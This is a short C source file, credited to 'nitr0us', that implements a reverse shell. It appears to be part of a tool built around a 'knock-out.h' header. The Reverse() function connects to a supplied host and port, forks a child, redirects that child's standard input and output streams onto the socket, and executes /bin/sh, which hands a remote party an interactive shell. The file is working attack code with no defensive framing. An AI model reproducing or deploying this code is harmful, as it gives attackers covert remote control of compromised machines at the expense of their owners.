/*
 * Sends a remote shell to host and port supplied
 *
 * by nitr0us
 *
 */

#include "knock-out.h"

void Reverse(const char *host, unsigned short port)
{
	struct sockaddr_in	hostinfo;
	int			sockfd;
	pid_t			pid;

	bzero(&hostinfo, sizeof(hostinfo));

	hostinfo.sin_family	= AF_INET;
	hostinfo.sin_port	= htons(port);
	if(!inet_aton(host, &hostinfo.sin_addr)){
		fprintf(stderr, "inet_aton() @ Reverse()\n");

		exit(EXIT_FAILURE);
	}

	if((sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
		error_n(errno, "socket() @ Reverse()");

	if(connect(sockfd, (struct sockaddr *)&hostinfo, sizeof(hostinfo)) == -1)
		error_n(errno, "connect() @ Reverse()");

	debugprint("-=[ [REVERSE] Connected to \"%s\"\n", host);

	if((pid = fork()) == -1)
		error_n(errno, "fork() @ Reverse()");
	else if(pid == 0){ // Child process sends a shell
		debugprint("-=[ [REVERSE] Child process created [PID: %d]\n", getpid());
		debugprint("-=[ [REVERSE] Sending /bin/sh to the port %d\n", port);

		dup2(sockfd, 0);
		dup2(sockfd, 1);
		dup2(sockfd, 2);
		execl("/bin/sh", "sh", NULL);
		error_n(errno, "execl() @ Reverse()");
	}

	// Parent process ends and returns

	close(sockfd);
}
